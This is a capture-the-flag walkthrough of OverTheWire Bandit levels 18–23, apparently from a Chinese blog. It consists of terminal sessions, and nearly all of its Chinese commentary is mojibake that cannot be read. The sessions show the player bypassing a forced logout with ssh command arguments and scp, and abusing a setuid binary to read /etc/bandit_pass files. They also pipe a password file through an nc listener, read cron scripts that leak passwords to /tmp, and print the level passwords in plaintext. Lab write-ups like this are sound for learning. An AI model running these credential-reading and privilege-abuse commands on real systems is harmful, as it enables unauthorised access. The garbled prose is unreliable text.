ä¹‹å‰æ²¡æ³¨æ„ï¼Œsshç§é’¥éœ€è¦600æƒé™ï¼Œç™»è¿›å»ä¹‹åå°±é¡ºæ‰‹çœ‹äº†ä¸‹å¯†ç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212  bandit17@bandit:~$ ls passwords.new passwords.old bandit17@bandit:~$ strings passwords.old 4d22drdsITVoHcfd8bAHeeKrdL3mMHpU QeGg8ya1PGU13yp57EWuUaxErl8VWjlM CUGTwQyhKs4fEQLH0UdD7ywCrYBDceZ7 2hUdQXUPpBJKzkslSHCOiC3ytdJ1cuqI WxgyH7990nLi81smXOeDGnKTpZTlAU3f g4diRjbnq4PhyC1rfuCaFXZmBLgHPmo6 MBf7rFYTik6DurpaVdC5mXngsTiXWwhv 3zt8L6QnDKXLGWhRvQBUczrk6O5KLl7i bm9g6Ypy9zVLojtpPaKBKViAKnL19QEY N2rkdeuoi1RBXCiCDQWlk4BU76M3wJFv PR0AOkN4NodK61ewgBHS56sEDr3LAobb CaVTEQzrWPuDvBm9D4CGL8BSC4arizFq FgheNL06s1UCW8UiuFUWSmtGedi2TxIH Lvh1gpC39tdJMAJH0atjJLF4yRlCoSH4 OpTHYem6UHMY2zLgwm2sI4e1faHw0M1b Z84471LxMWArPnxJGsMmvvl2qCcBXZ7M CExYI7LMdZLSj9AiFp8rutQY6uIcqdfx lC1IFZxlnj05ZuWKY5Ytad9bTZ0eMgYC 4OfOZR4CMqlUFgxw8nZbKtW3eJcZPrqn bbctuDOWMvYUCWAiY7APEUnYPUo0zYiT sCepFVPJBglEuU8uY0LllG1oIJ2HOvrH o9sp7odH3blIlshg2aCrWPdzuDq5lxx5 97Vd3224QGOfsPGwjURphDfn7ISeXd3S Tz97n5taD1ZskKSlC1WHDU1CZZ5I3PnM NDkYNzqHAZnjn7GoKk6kUjmBwLbZ5IjT pd1THzlzKbAnR9uPnI75EpXdZVUFyVD9 GGwbSfJpRjzYvNHb1n2riVU3VnxCSe9I qLufXtxv2XKcjrWDqIojlINiJhU9LYCp kpxAYarBToFo4Vsr1jDBQREvRtbUA9i2 s8ZEkk0YuNoA9YnyUvVwFy29cMIP4psJ m0q33SCpHDBfTL2yRb8Db2lb6qIX8hjf xhHqvStzyrj0k1eLNbiQHmadzlY80iZg FExGbU63PyeJsfxtoIaVjiFKXAhEon0C 04y09Cd0CvZBSnrC1BjauTj70D3P84Gw Kr58zsSpmfKy4ILtUqbo2hqooPHnI13L ruisEF4OA3MyOdLEFwVdW84ZwJXRioRT kN2hWkHUehtqqWpnZW1CulYiOv8RJwPl V045YMJnMGdta9yQD8ALdny0hholXmdw gZ5U640FLMMChheWKHNdaQ1lKzLuqjxZ Al0xVJb5bEzhnFG8nPFe6IJa2FjXVSzo CT2ZJy6MoLkTqdHuhL5zUIsW41WCntAA hlbSBPAWJmL6WFDb06gpTx1pPButblOA 46lUvvv0JJzyY0IOhWgGp5IjfsllmvaC FcSd4Me936rwbk2pAU9ylx9NXTrzdCaX vfU4mCzATtqUMNLg3a7mPs3OY6Dr4jaZ mOWgkKPfjXibrdfgG57CWMcbeqBRg4IU VudOaCtkUbhOdF7dE7KACOqH0R9weDhQ vzwsuF0cp5IrmEmGb7qNr4VUlsLi463t ymAqpKh2CPdC7iqFk4KcKdlXeKZqSrhW ta02hN70k7BoxfiVn7viAFoWKaGDOKnC bPLvqxn5BDtg4wy8c2uO0x7y3yi3RPMU VUcDEAfnRTt8nTlAd55q94L6rr0jfCCU QAIDBC5fx4bBOsyOd8NYItiPWGMaGXY9 X1NUQJrIsrNfaGHMUolOcepDiNss842e DAL411ARIMja2B3VibQxzNn8iqxCvtPB Gq0BvsinoaBAuqwLJwtWCSe1wMdiSBSZ RVO0eC5aK1WRlpKqPAglNSOPwc1OvUp8 XCBD77G8bknfL90F44o0Nbe1jqCBvxqh qOZOpK7UHdGgsZeQirx8wr9omjopkzuP nQ1IO5OUcJ4P8ZSrLYNQLFnWS32AMUcE oUpDAclcfOrSI10qeUCHqxvSxR0aXyrN uzPVdEpMDIvTBj3eB4mgmhEeCg1WEFqL WThihtgEnlmNQ6SAqROgERjyxNfgJZk5 l9sPHyleBjYNlZxQbHiCKNoeEfL7W3RA qfcmi6vHWL5CS7nqkHTcSdeRIoxDEGjU cI4zMnmzAP4Ei6FvZQ4vgvUhrhKYajGH MlKrQsbeU3cvq0GNIvwSMipBFUCHRLb4 yqPoTs4J1oNw6KqREjqQk1fXNxAtQzNN 6HgQNDvsu4VC7KBhIpQRCIRhLo4izRjG nPhoiXgdg3T385gjubCcKtnEa2kSQYiF BBWqlFI2IycHpCSESbmi8bgQ3XaRVkH9 zC5qgaooKVu5QNTtqEXcgPpmX2IXZcd5 BP8DJZaleBMYuyMzG96xJ6RDk6QUvLoi NsYnz4oTlDRKsDyWWVvseAeLnrVz80ul 2MVRp5Pej7Ngv3QlcfY9MhFrpm1EER3U niQz99Dp18DDLdpkqxatJEorlEuxbffD 0LZ5juRJ7Kpn9Y1d2tnXjZY5Qe5YsoSn DFkA6xfENw4qcgbyJOR1Lq4wHzoEzXf1 DuyGtXuifUSHgURCvn8wW8ZVGkMFEwCG lsp7PdEBOlGtgQaiZA1BMdxpHPA0YPCt fZPxMUd4y9F8Ty8W36yMVQRVxJ7M1n4B rNnhvIf0O32W7YkNFetirVBSHpxx8PVa IAvk989y4J29tuDjZlSUAcQJ0GKlSLA7 6h32PPx4KHY0pxOVSViJDOzjaidS79i5 3bCdLIIpnsFeobeQnORAVeM7dwvlRhYc VlaVTJjuHSNlmnukU27pLKfjQDcpFm0R jVxCHhuF6NHsDa6UdNHgBdNIDH7SZzCE tY71skfE2Y1Tez1451HdcwjueU9wWO9S JUplInoYI9VmMuoTU64WX9fQgljz0SRr YCScjMB7OB5QL8ZiPgyd7wRqlsqhjjGu 3fBUnc3gvyg7iyW1V4D0quYJPM3iNNy4 mrbw5khrpkAXdNfkTs6Eqzj8Am07I4CK crz9kBtBVlvTVZnvJ3AqfeFYuw89koZh uD036o50sDvVj9JU0ZMi76np4kE2SLw6 6QX3T8Ul4qgruVmX0Vx8h7H8GkTyAoZ1 EbdKERioX8ShHYhFCIFVIyvP13kL75jA QyRSUG1osue0Rrc114FF98YH7HjJWPgJ jMxInIjNK0ChvSQX10862VqCwIQsek95 2pqtLZiT8CzsalDfnn68FjdhbtgqEK1C 80JH1LNM5JFed5XQBVYeiKU5qNNqDjLS bandit17@bandit:~$ strings passwords.new 4d22drdsITVoHcfd8bAHeeKrdL3mMHpU QeGg8ya1PGU13yp57EWuUaxErl8VWjlM CUGTwQyhKs4fEQLH0UdD7ywCrYBDceZ7 2hUdQXUPpBJKzkslSHCOiC3ytdJ1cuqI WxgyH7990nLi81smXOeDGnKTpZTlAU3f g4diRjbnq4PhyC1rfuCaFXZmBLgHPmo6 MBf7rFYTik6DurpaVdC5mXngsTiXWwhv 3zt8L6QnDKXLGWhRvQBUczrk6O5KLl7i bm9g6Ypy9zVLojtpPaKBKViAKnL19QEY N2rkdeuoi1RBXCiCDQWlk4BU76M3wJFv PR0AOkN4NodK61ewgBHS56sEDr3LAobb CaVTEQzrWPuDvBm9D4CGL8BSC4arizFq FgheNL06s1UCW8UiuFUWSmtGedi2TxIH Lvh1gpC39tdJMAJH0atjJLF4yRlCoSH4 OpTHYem6UHMY2zLgwm2sI4e1faHw0M1b Z84471LxMWArPnxJGsMmvvl2qCcBXZ7M CExYI7LMdZLSj9AiFp8rutQY6uIcqdfx lC1IFZxlnj05ZuWKY5Ytad9bTZ0eMgYC 4OfOZR4CMqlUFgxw8nZbKtW3eJcZPrqn bbctuDOWMvYUCWAiY7APEUnYPUo0zYiT sCepFVPJBglEuU8uY0LllG1oIJ2HOvrH o9sp7odH3blIlshg2aCrWPdzuDq5lxx5 97Vd3224QGOfsPGwjURphDfn7ISeXd3S Tz97n5taD1ZskKSlC1WHDU1CZZ5I3PnM NDkYNzqHAZnjn7GoKk6kUjmBwLbZ5IjT pd1THzlzKbAnR9uPnI75EpXdZVUFyVD9 GGwbSfJpRjzYvNHb1n2riVU3VnxCSe9I qLufXtxv2XKcjrWDqIojlINiJhU9LYCp kpxAYarBToFo4Vsr1jDBQREvRtbUA9i2 s8ZEkk0YuNoA9YnyUvVwFy29cMIP4psJ m0q33SCpHDBfTL2yRb8Db2lb6qIX8hjf xhHqvStzyrj0k1eLNbiQHmadzlY80iZg FExGbU63PyeJsfxtoIaVjiFKXAhEon0C 04y09Cd0CvZBSnrC1BjauTj70D3P84Gw Kr58zsSpmfKy4ILtUqbo2hqooPHnI13L ruisEF4OA3MyOdLEFwVdW84ZwJXRioRT kN2hWkHUehtqqWpnZW1CulYiOv8RJwPl V045YMJnMGdta9yQD8ALdny0hholXmdw gZ5U640FLMMChheWKHNdaQ1lKzLuqjxZ Al0xVJb5bEzhnFG8nPFe6IJa2FjXVSzo CT2ZJy6MoLkTqdHuhL5zUIsW41WCntAA kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd 46lUvvv0JJzyY0IOhWgGp5IjfsllmvaC FcSd4Me936rwbk2pAU9ylx9NXTrzdCaX vfU4mCzATtqUMNLg3a7mPs3OY6Dr4jaZ mOWgkKPfjXibrdfgG57CWMcbeqBRg4IU VudOaCtkUbhOdF7dE7KACOqH0R9weDhQ vzwsuF0cp5IrmEmGb7qNr4VUlsLi463t ymAqpKh2CPdC7iqFk4KcKdlXeKZqSrhW ta02hN70k7BoxfiVn7viAFoWKaGDOKnC bPLvqxn5BDtg4wy8c2uO0x7y3yi3RPMU VUcDEAfnRTt8nTlAd55q94L6rr0jfCCU QAIDBC5fx4bBOsyOd8NYItiPWGMaGXY9 X1NUQJrIsrNfaGHMUolOcepDiNss842e DAL411ARIMja2B3VibQxzNn8iqxCvtPB Gq0BvsinoaBAuqwLJwtWCSe1wMdiSBSZ RVO0eC5aK1WRlpKqPAglNSOPwc1OvUp8 XCBD77G8bknfL90F44o0Nbe1jqCBvxqh qOZOpK7UHdGgsZeQirx8wr9omjopkzuP nQ1IO5OUcJ4P8ZSrLYNQLFnWS32AMUcE oUpDAclcfOrSI10qeUCHqxvSxR0aXyrN uzPVdEpMDIvTBj3eB4mgmhEeCg1WEFqL WThihtgEnlmNQ6SAqROgERjyxNfgJZk5 l9sPHyleBjYNlZxQbHiCKNoeEfL7W3RA qfcmi6vHWL5CS7nqkHTcSdeRIoxDEGjU cI4zMnmzAP4Ei6FvZQ4vgvUhrhKYajGH MlKrQsbeU3cvq0GNIvwSMipBFUCHRLb4 yqPoTs4J1oNw6KqREjqQk1fXNxAtQzNN 6HgQNDvsu4VC7KBhIpQRCIRhLo4izRjG nPhoiXgdg3T385gjubCcKtnEa2kSQYiF BBWqlFI2IycHpCSESbmi8bgQ3XaRVkH9 zC5qgaooKVu5QNTtqEXcgPpmX2IXZcd5 BP8DJZaleBMYuyMzG96xJ6RDk6QUvLoi NsYnz4oTlDRKsDyWWVvseAeLnrVz80ul 2MVRp5Pej7Ngv3QlcfY9MhFrpm1EER3U niQz99Dp18DDLdpkqxatJEorlEuxbffD 0LZ5juRJ7Kpn9Y1d2tnXjZY5Qe5YsoSn DFkA6xfENw4qcgbyJOR1Lq4wHzoEzXf1 DuyGtXuifUSHgURCvn8wW8ZVGkMFEwCG lsp7PdEBOlGtgQaiZA1BMdxpHPA0YPCt fZPxMUd4y9F8Ty8W36yMVQRVxJ7M1n4B rNnhvIf0O32W7YkNFetirVBSHpxx8PVa IAvk989y4J29tuDjZlSUAcQJ0GKlSLA7 6h32PPx4KHY0pxOVSViJDOzjaidS79i5 3bCdLIIpnsFeobeQnORAVeM7dwvlRhYc VlaVTJjuHSNlmnukU27pLKfjQDcpFm0R jVxCHhuF6NHsDa6UdNHgBdNIDH7SZzCE tY71skfE2Y1Tez1451HdcwjueU9wWO9S JUplInoYI9VmMuoTU64WX9fQgljz0SRr YCScjMB7OB5QL8ZiPgyd7wRqlsqhjjGu 3fBUnc3gvyg7iyW1V4D0quYJPM3iNNy4 mrbw5khrpkAXdNfkTs6Eqzj8Am07I4CK crz9kBtBVlvTVZnvJ3AqfeFYuw89koZh uD036o50sDvVj9JU0ZMi76np4kE2SLw6 6QX3T8Ul4qgruVmX0Vx8h7H8GkTyAoZ1 EbdKERioX8ShHYhFCIFVIyvP13kL75jA QyRSUG1osue0Rrc114FF98YH7HjJWPgJ jMxInIjNK0ChvSQX10862VqCwIQsek95 2pqtLZiT8CzsalDfnn68FjdhbtgqEK1C 80JH1LNM5JFed5XQBVYeiKU5qNNqDjLS bandit17@bandit:~$ diff passwords.old passwords.new 42c42 \u003c hlbSBPAWJmL6WFDb06gpTx1pPButblOA --- \u003e kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd bandit17@bandit:~$   è¿™ä¹ˆé•¿è‚¯å®šä¸å¯èƒ½ç”¨è‚‰çœ¼å»ä»£æ›¿æœºå™¨åšçš„äº‹å˜›\næ‰€ä»¥å°±ç”¨åˆ°äº†diffå‘½ä»¤\n\u003cä¸ºç¬¬ä¸€ä¸ªæ–‡ä»¶ï¼Œ\u003e ä¸ºç¬¬äºŒä¸ªæ–‡ä»¶ï¼Œå› æ­¤flagä¸ºkfBf3eYk5BPBRzwjqutbbfE887SVc5Yd\nlevel 19 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  bl@bl-virtual-machine:~/wargame$ ssh bandit18@bandit.labs.overthewire.org -p 2220 This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit18@bandit.labs.overthewire.org's password: #kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd Linux bandit 4.18.12 x86_64 GNU/Linux ,----.. ,----, .---. / / \\ ,/ .`| /. ./| / . : ,` .' : .--'. ' ; . / ;. \\  ; ; / /__./ \\ : | . ; / ` ; .'___,/ ,' .--'. ' \\' . ; | ; \\ ; | | : | /___/ \\ | ' ' | : | ; | ' ; |.'; ; ; \\  \\; : . | ' ' ' : `----' | | \\  ; ` | ' ; \\; / | ' : ; . \\  .\\  ; \\  \\  ', / | | ' \\  \\  ' \\ | ; : / ' : | : ' |--\" \\ \\ .' ; |.' \\ \\ ; www. `---` ver '---' he '---\" ire.org Welcome to OverTheWire! Enjoy your stay! Byebye ! Connection to bandit.labs.overthewire.org closed. bl@bl-virtual-machine:~/wargame$  ç”±ä¸Šä¸€å…³æç¤ºå·²ç»çŸ¥é“äº†ï¼Œæˆ‘ä»¬ä¼šçœ‹åˆ°byebyeï¼Œç›´æ¥çœ‹é¢˜ç›®\n.bashrcä¼šç¦æ­¢æ‰€æœ‰é€šè¿‡sshç™»é™†çš„\n ä»…ä½œäº†è§£ï¼Œé”™è¯¯æ–¹å‘\nhttps://blog.csdn.net/luoluonuoyasuolong/article/details/88806211\n ä¸€ç§æ–¹æ³•æ˜¯åˆ©ç”¨å‘½ä»¤æ‹¼æ¥ï¼Œå°†å‘½ä»¤ä½œä¸ºå‚æ•°ä¼ è¿‡å»ï¼Œåœ¨æ‰§è¡Œshellä¹‹å‰è¿è¡Œ\n1 2 3 4 5 6  bl@bl-virtual-machine:~/wargame$ ssh bandit18@bandit.labs.overthewire.org -p 2220 'cat ./readme' This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit18@bandit.labs.overthewire.org's password: IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x   ç¬¬äºŒç§æ–¹å¼åˆ©ç”¨scpå‘½ä»¤ç»•è¿‡\n1 2 3 4 5 6 7 8  bl@bl-virtual-machine:~/wargame$ scp -P 2220 bandit18@bandit.labs.overthewire.org:./readme ./readme This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit18@bandit.labs.overthewire.org's password: readme 100% 33 0.0KB/s 00:00 bl@bl-virtual-machine:~/wargame$ cat ./readme IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x bl@bl-virtual-machine:~/wargame$   é¡ºä¾¿çˆ¬ä¸‹äº†ä»–çš„.bashrcæ–‡ä»¶ï¼Œè¿™é“é¢˜çš„ä¸‡æ¶ä¹‹æº\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116  # ~/.bashrc: executed by bash(1) for non-login shells. # see /usr/share/doc/bash/examples/startup-files (in the package bash-doc) # for examples # If not running interactively, don't do anything case $- in *i*) ;; *) return;; esac # don't put duplicate lines or lines starting with space in the history. # See bash(1) for more options HISTCONTROL=ignoreboth # append to the history file, don't overwrite it shopt -s histappend # for setting history length see HISTSIZE and HISTFILESIZE in bash(1) HISTSIZE=1000 HISTFILESIZE=2000 # check the window size after each command and, if necessary, # update the values of LINES and COLUMNS. shopt -s checkwinsize # If set, the pattern \"**\" used in a pathname expansion context will # match all files and zero or more directories and subdirectories. #shopt -s globstar # make less more friendly for non-text input files, see lesspipe(1) #[ -x /usr/bin/lesspipe ] \u0026\u0026 eval \"$(SHELL=/bin/sh lesspipe)\" # set variable identifying the chroot you work in (used in the prompt below) if [ -z \"${debian_chroot:-}\" ] \u0026\u0026 [ -r /etc/debian_chroot ]; then debian_chroot=$(cat /etc/debian_chroot) fi # set a fancy prompt (non-color, unless we know we \"want\" color) case \"$TERM\" in xterm-color|*-256color) color_prompt=yes;; esac # uncomment for a colored prompt, if the terminal has the capability; turned # off by default to not distract the user: the focus in a terminal window # should be on the output of commands, not on the prompt #force_color_prompt=yes if [ -n \"$force_color_prompt\" ]; then if [ -x /usr/bin/tput ] \u0026\u0026 tput setaf 1 \u003e\u0026/dev/null; then # We have color support; assume it's compliant with Ecma-48 # (ISO/IEC-6429). (Lack of such support is extremely rare, and such # a case would tend to support setf rather than setaf.) color_prompt=yes else color_prompt= fi fi if [ \"$color_prompt\" = yes ]; then PS1='${debian_chroot:+($debian_chroot)}\\[\\033[01;32m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ ' else PS1='${debian_chroot:+($debian_chroot)}\\u@\\h:\\w\\$ ' fi unset color_prompt force_color_prompt # If this is an xterm set the title to user@host:dir case \"$TERM\" in xterm*|rxvt*) PS1=\"\\[\\e]0;${debian_chroot:+($debian_chroot)}\\u@\\h: \\w\\a\\]$PS1\" ;; *) ;; esac # enable color support of ls and also add handy aliases if [ -x /usr/bin/dircolors ]; then test -r ~/.dircolors \u0026\u0026 eval \"$(dircolors -b ~/.dircolors)\" || eval \"$(dircolors -b)\" alias ls='ls --color=auto' #alias dir='dir --color=auto' #alias vdir='vdir --color=auto' #alias grep='grep --color=auto' #alias fgrep='fgrep --color=auto' #alias egrep='egrep --color=auto' fi # colored GCC warnings and errors #export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01' # some more ls aliases #alias ll='ls -l' #alias la='ls -A' #alias l='ls -CF' # Alias definitions. # You may want to put all your additions into a separate file like # ~/.bash_aliases, instead of adding them here directly. # See /usr/share/doc/bash-doc/examples in the bash-doc package. if [ -f ~/.bash_aliases ]; then . ~/.bash_aliases fi # enable programmable completion features (you don't need to enable # this, if it's already enabled in /etc/bash.bashrc and /etc/profile # sources /etc/bash.bashrc). if ! shopt -oq posix; then if [ -f /usr/share/bash-completion/bash_completion ]; then . /usr/share/bash-completion/bash_completion elif [ -f /etc/bash_completion ]; then . /etc/bash_completion fi fi echo 'Byebye !' exit 0   level 20  å…³äºsetuidï¼šhttps://blog.csdn.net/oo__yan/article/details/7076889\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104  bandit19@bandit:~$ ls bandit20-do bandit19@bandit:~$ ./bandit20-do Run a command as another user. Example: ./bandit20-do id bandit19@bandit:~$ strings bandit20-do /lib/ld-linux.so.2 libc.so.6 _IO_stdin_used exit execv printf __libc_start_main __gmon_start__ GLIBC_2.0 PTRh0 QVhk UWVS t$,U [^_] Run a command as another user. Example: %s id /usr/bin/env ;*2$\" GCC: (Debian 6.3.0-18+deb9u1) 6.3.0 20170516 crtstuff.c __JCR_LIST__ deregister_tm_clones __do_global_dtors_aux completed.6587 __do_global_dtors_aux_fini_array_entry frame_dummy __frame_dummy_init_array_entry bandit20.c __FRAME_END__ __JCR_END__ __init_array_end _DYNAMIC __init_array_start __GNU_EH_FRAME_HDR _GLOBAL_OFFSET_TABLE_ __libc_csu_fini __x86.get_pc_thunk.bx printf@@GLIBC_2.0 _edata __data_start __gmon_start__ exit@@GLIBC_2.0 __dso_handle _IO_stdin_used __libc_start_main@@GLIBC_2.0 execv@@GLIBC_2.0 __libc_csu_init _fp_hw __bss_start main __TMC_END__ .symtab .strtab .shstrtab .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rel.dyn .rel.plt .init .plt.got .text .fini .rodata .eh_frame_hdr .eh_frame .init_array .fini_array .jcr .dynamic .got.plt .data .bss .comment bandit19@bandit:~$./bandit20-do Run a command as another user. Example: ./bandit20-do id bandit19@bandit:~$./bandit20-do id uid=11019(bandit19) gid=11019(bandit19) euid=11020(bandit20) groups=11019(bandit19) bandit19@bandit:~$ls -al total 28 drwxr-xr-x 2 root root 4096 Oct 16 2018 . drwxr-xr-x 41 root root 4096 Oct 16 2018 .. -rwsr-x--- 1 bandit20 bandit19 7296 Oct 16 2018 bandit20-do -rw-r--r-- 1 root root 220 May 15 2017 .bash_logout -rw-r--r-- 1 root root 3526 May 15 2017 .bashrc -rw-r--r-- 1 root root 675 May 15 2017 .profile bandit19@bandit:~$./bandit20-do whoami bandit20 bandit19@bandit:~$./bandit20-do cat /etc/bandit_pass/bandit20 GbKksEFF4yrVs6il55v6gwY5aVje5f0j bandit19@bandit:~$  è¿™ä¸€å…³æ¶‰åŠåˆ°çš„æ˜¯linuxæƒé™çš„ç›¸å…³çŸ¥è¯†ã€‚/etc/bandit_pass/bandit20çš„æ‰€æœ‰è€…ä¸ºbandit20ï¼Œè€Œå…¶æƒé™è®¾ç½®ä½¿å¾—åªæœ‰è‡ªèº«å’Œbandit20è¿™ä¸ªgroupçš„æˆå‘˜èƒ½å¤Ÿè¯»å–ã€‚\nsetuidè¿™ä¸ªæ–‡ä»¶çš„æ‹¥æœ‰è€…ä¸ºbandit20ï¼Œè€Œbandit19ï¼Œä¹Ÿå°±æ˜¯å½“å‰ç™»å½•ç”¨æˆ·æœ‰æ‰§è¡Œçš„æƒé™ã€‚è€Œè¯¥æ–‡ä»¶æœ‰sæƒé™ï¼Œå³setuidæƒé™ã€‚èƒ½å¤Ÿåœ¨ç¨‹åºä¸­è°ƒç”¨setuid()ç³»ç»Ÿè°ƒç”¨ï¼Œå°†è‡ªèº«çš„suidæ”¹æˆä¸euidç›¸åŒï¼Œä¹Ÿå°±æ˜¯åœ¨è¿è¡Œä¸­ä½œä¸ºbandit20æ‰§è¡Œå‘½ä»¤ã€‚\nå¯¹äºæ‰‹å¤´çš„è¿™ä¸ªæ–‡ä»¶ï¼Œåªè¦å°†æ¬²æ‰§è¡Œçš„å‘½ä»¤ä½œä¸ºå‚æ•°ä¼ å…¥å³å¯ã€‚\nè¿™æ ·çš„æ–‡ä»¶å¦‚æœèƒ½å¤Ÿé€šè¿‡ä¸€å®šæ–¹å¼æ‰§è¡Œå‘½ä»¤ç”šè‡³äºè·å¾—shellï¼Œæ˜¯æ¸—é€äººå‘˜ç†æƒ³çš„ææƒé€”å¾„ã€‚\nlevel 21 é¢˜ç›®çš„æ„æ€æ˜¯æœ‰ä¸€ä¸ªsetuidçš„æ‰§è¡Œæ–‡ä»¶ï¼Œä»–ä¼šå’Œlocalhostçš„ç»™å®šç«¯å£å»ºç«‹è¿æ¥ï¼Œç„¶åä»–ä¼šä»è¿æ¥ä¸­è¯»å–ä¸€è¡Œä¿¡æ¯ï¼Œå°†å…¶å’Œå‰ä¸€å…³çš„flagå¯¹æ¯”ï¼Œæ­£ç¡®å°±ä¼šè¿”å›flag\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  bandit20@bandit:~$ ls -al total 32 drwxr-xr-x 2 root root 4096 Oct 16 2018 . drwxr-xr-x 41 root root 4096 Oct 16 2018 .. -rw-r--r-- 1 root root 220 May 15 2017 .bash_logout -rw-r--r-- 1 root root 3526 May 15 2017 .bashrc -rw-r--r-- 1 root root 675 May 15 2017 .profile -rwsr-x--- 1 bandit21 bandit20 12088 Oct 16 2018 suconnect bandit20@bandit:~$ ./suconnect Usage: ./suconnect \u003cportnumber\u003e This program will connect to the given port on localhost using TCP. If it receives the correct password from the other side, the next password is transmitted back. bandit20@bandit:~$ nc -lp 2333 \u003c /etc/bandit_pass/bandit20 gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr bandit20@bandit:~$   åˆ©ç”¨ncç›‘å¬ç«¯å£å³å¯åšåˆ°\n1 2 3 4 5 6 7  bandit20@bandit:~$ bandit20@bandit:~$ ls suconnect bandit20@bandit:~$ ./suconnect 2333 Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j Password matches, sending next password bandit20@bandit:~$   level 22 è¿™å…³åŸä»¥ä¸ºæ˜¯è®©äº†è§£crontabçš„ç”¨æ³•ï¼Œæ²¡æƒ³åˆ°çœ‹æ‰§è¡Œæ–‡ä»¶å¹²äº†ä»€ä¹ˆå°±å¾—åˆ°äº†flag\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  bandit21@bandit:~$ cat /etc/bandit_pass/bandit21 gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr bandit21@bandit:~$ ls /etc/cron.d/ atop cronjob_bandit22 cronjob_bandit23 cronjob_bandit24 bandit21@bandit:~$ cat /etc/cron.d/atop PATH=/bin:/usr/bin:/sbin:/usr/sbin # daily restart of atop at midnight 0 0 * * * root if [ -d \"/run/systemd/system\" ]; then systemctl restart atop; else /usr/share/atop/atop.daily \\\u0026 ; fi bandit21@bandit:~$ cat /etc/cron.d/cronjob_bandit22 @reboot bandit22 /usr/bin/cronjob_bandit22.sh \u0026\u003e /dev/null * * * * * bandit22 /usr/bin/cronjob_bandit22.sh \u0026\u003e /dev/null bandit21@bandit:~$ cat /usr/bin/cronjob_bandit22.sh #!/bin/bash chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv cat /etc/bandit_pass/bandit22 \u003e /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv bandit21@bandit:~$ cat /usr/bin/cronjob_bandit23.sh cat: /usr/bin/cronjob_bandit23.sh: Permission denied bandit21@bandit:~$ crontab -l crontabs/bandit21/: fopen: Permission denied bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI   level 23  https://www.linuxidc.com/Linux/2019-03/157335.htm\nå…¶ä»–çš„ï¼š\nhttps://blog.csdn.net/long2746004900/article/details/53367353\nhttps://blog.csdn.net/zhongqi2513/article/details/78613768\n è¿™å…³çš„æ ¸å¿ƒè¿˜æ˜¯é˜…è¯»shellæ–‡ä»¶\né¢˜ç›®ä¹Ÿååˆ†æ¸©é¦¨çš„æé†’äº†ï¼Œè‹¥æ˜¯ä¸æ‡‚å¯ä»¥è¿è¡Œè¿è¡Œdebug\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  bandit22@bandit:~$ ls /etc/cron.d atop cronjob_bandit22 cronjob_bandit23 cronjob_bandit24 bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23 @reboot bandit23 /usr/bin/cronjob_bandit23.sh \u0026\u003e /dev/null * * * * * bandit23 /usr/bin/cronjob_bandit23.sh \u0026\u003e /dev/null bandit22@bandit:~$ cat /usr/bin/cron cronjob_bandit22.sh cronjob_bandit24.sh cronjob_bandit23.sh crontab bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh #!/bin/bash myname=$(whoami) mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1) echo \"Copying passwordfile /etc/bandit_pass/$mynameto /tmp/$mytarget\" cat /etc/bandit_pass/$myname \u003e /tmp/$mytarget bandit22@bandit:~$ echo I am user $myname | md5sum | cut -d ' ' -f 1 7db97df393f40ad1691b6e1fb03d53eb bandit22@bandit:~$ cat 